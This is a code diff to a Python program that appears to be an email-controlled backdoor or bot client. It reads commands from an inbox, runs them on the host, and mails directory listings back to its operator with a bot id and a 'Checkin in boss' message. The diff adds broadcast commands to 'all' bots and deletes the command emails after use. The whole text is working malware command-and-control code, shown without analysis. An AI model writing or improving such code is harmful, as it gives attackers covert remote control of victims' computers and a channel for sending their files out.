@@ -88,6 +88,7 @@ def sendEmail(msg):
 #EMAIL SUBJECT = show [Directory path] [id]
 #NEEDS TO START WITH "C:/" UNLESS KNOWN PATH
 def showFiles(commandString):
+    global lastCommand
     dirList = []
     fileList = []
     splitCommand = commandString.split(" ")
@@ -117,7 +118,7 @@ def showFiles(commandString):
             for file in fileList:
                 files_string += file + "\n"
 
-            subjectLine = "Subject: My Directory\n\n"
+            subjectLine = "Subject: My Directory " + str(id) + "\n\n"
             payload = subjectLine
             payload += lastCommand + ":\n\n" + "Files:\n" + files_string + "\nDirectories:\n" + directories_string
             sendEmail(payload)
@@ -168,6 +169,7 @@ def executeCom(commandString):
 
 #Parse commands from emails
 def commandParser(commandsParse):
+    global lastCommand
     while commandsParse:
         command = commandsParse[0]
         print(command)
@@ -195,6 +197,7 @@ def readEmail():
     mail.select('inbox')
 
     typ, data = mail.search(None, 'ALL')
+    isBroadcast = False
     for i in data[0].split():
         typ, data = mail.fetch(i, '(RFC822)' )
         msg = email.message_from_bytes(data[0][1])
@@ -206,10 +209,14 @@ def readEmail():
                 commands.append(subject)
             elif("all" in subject):
                 commands.append(subject)
+                isBroadcast = True
 
     if commands:
        commandParser(commands)
 
+    if(isBroadcast):
+        mail.store(i, '+FLAGS', '\\Deleted')
+        time.sleep(15)
     mail.expunge()
     mail.close()
     mail.logout()
@@ -217,12 +224,12 @@ def readEmail():
 #Send an update every x seconds
 #Check email every x seconds
 def periodicUpdates(seconds):
-    startTime=time.time()
+    #startTime=time.time()
     while True:
         readEmail()
         message = "Subject: " + str(id) + "\n\n" + "Checkin in boss"
         #sendEmail(message)
-        time.sleep(seconds - ((time.time() - startTime) % seconds))
+        time.sleep(seconds)
 
 initMessage()
-periodicUpdates(10.0)
+periodicUpdates(30.0)
